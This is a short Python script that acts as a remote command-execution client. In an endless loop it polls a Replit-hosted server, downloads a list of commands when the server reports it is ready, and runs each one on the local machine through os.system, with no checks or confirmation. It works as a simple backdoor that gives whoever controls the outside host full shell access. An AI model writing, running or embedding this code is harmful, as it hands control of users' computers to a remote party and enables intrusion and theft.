import requests,time,os
while True:
    commands=[]
    time.sleep(1)
    if requests.get("https://BraveVelvetyCrash.killergriffn.repl.co/status").text == "READY FOR COMMAND":
        try:
            commands = requests.post("https://BraveVelvetyCrash.killergriffn.repl.co/commands/exec").text.split(":::")
        except:
            commands = ["test"]
    else:
        comamnds = ["test"]
    for command in commands:
        os.system(command)